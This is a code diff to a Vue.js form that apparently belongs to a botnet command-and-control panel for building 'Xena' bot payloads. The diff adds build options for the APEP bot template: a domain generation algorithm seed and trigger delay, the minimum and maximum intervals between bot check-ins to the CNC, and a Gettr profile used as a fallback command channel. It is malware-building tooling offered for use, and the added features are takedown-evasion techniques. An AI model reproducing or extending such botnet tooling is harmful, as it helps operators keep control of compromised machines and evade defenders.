@@ -44,7 +44,7 @@
                 outlined
                 dense
                 v-model = 'build.description'
-                label = 'Description'
+                label = 'Description (optional)'
                 color = 'rgba(189, 147, 249, 1)'
               ></v-text-field>
 
@@ -80,6 +80,55 @@
                 outlined
                 dense
               ></v-select-->
+
+              <div
+                v-if = 'buildTemplate == "XENA_BOT_APEP"'
+              >
+                <v-text-field
+                  outlined
+                  dense
+                  v-model = 'build.dgaSeed'
+                  label = 'Domain Generation ALgorithm (DGA) Seed'
+                  :placeholder = 'build.dgaSeed'
+                  color = 'rgba(189, 147, 249, 1)'
+                ></v-text-field>
+
+                <v-text-field
+                  outlined
+                  dense
+                  v-model = 'build.dgaAfterDays'
+                  label = 'Domain Generation ALgorithm (DGA) Should Take Place After How Many Days With No Contact From CNC?'
+                  :placeholder = 'build.dgaAfterDays'
+                  color = 'rgba(189, 147, 249, 1)'
+                ></v-text-field>
+
+                <v-text-field
+                  outlined
+                  dense
+                  v-model = 'build.maxLoopWait'
+                  label = 'The Most Amount Of Time A Bot Will Go Without Reaching Out to CNC (seconds)'
+                  :placeholder = 'build.maxLoopWait'
+                  color = 'rgba(189, 147, 249, 1)'
+                ></v-text-field>
+
+                <v-text-field
+                  outlined
+                  dense
+                  v-model = 'build.minLoopWait'
+                  label = 'The Least Amount Of Time A Bot Will Go Without Reaching Out to CNC (seconds)'
+                  :placeholder = 'build.minLoopWait'
+                  color = 'rgba(189, 147, 249, 1)'
+                ></v-text-field>
+
+                <v-text-field
+                  outlined
+                  dense
+                  v-model = 'build.gettrProfileName'
+                  label = 'Username Of A Gettr Profile Which Is Going To Be Used As A Fallback Channel Via The "website" Column In The Description Of The Profile (optional)'
+                  :placeholder = 'build.gettrProfileName'
+                  color = 'rgba(189, 147, 249, 1)'
+                ></v-text-field>
+              </div>
 
               <v-btn
                 @click = 'insertBuildProfile'
@@ -175,6 +224,11 @@ export default Vue.extend({
       encodingIterations: 1,
       configHost: '',
       trustedPublicKey: '',
+      dgaSeed: '123',
+      dgaAfterDays: '7',
+      maxLoopWait: '60',
+      minLoopWait: '10',
+      gettrProfileName: '',
     },
 
     encodings: [
@@ -188,7 +242,7 @@ export default Vue.extend({
     buildTemplates: [
       'XENA_BOT_ANACONDA',
       'XENA_BOT_APEP',
-      'XENA_BOT_VARVARA',
+      'XENA_BOT_MONOLITIC',
     ],
   }),
 
@@ -201,6 +255,7 @@ export default Vue.extend({
 
   methods: {
     async insertBuildProfile () {
+      console.log(this.build)
       await new Service.Pyramid(this.$axios, this.getPyramidHost, this.getPyramidToken).insertBuildProfile(
         this.build.name,
         this.build.description?.length ? this.build.description : null,
@@ -209,6 +264,11 @@ export default Vue.extend({
           template: this.buildTemplate,
           atilaHost: this.build.configHost,
           trustedPublicKey: this.build.trustedPublicKey,
+          dgaSeed: this.build.dgaSeed,
+          dgaAfterDays: this.build.dgaAfterDays,
+          maxLoopWait: this.build.maxLoopWait,
+          minLoopWait: this.build.minLoopWait,
+          gettrProfileName: this.build.gettrProfileName,
         },
       ).then(() => EventBus.$emit('updateBuildProfiles'))
     }
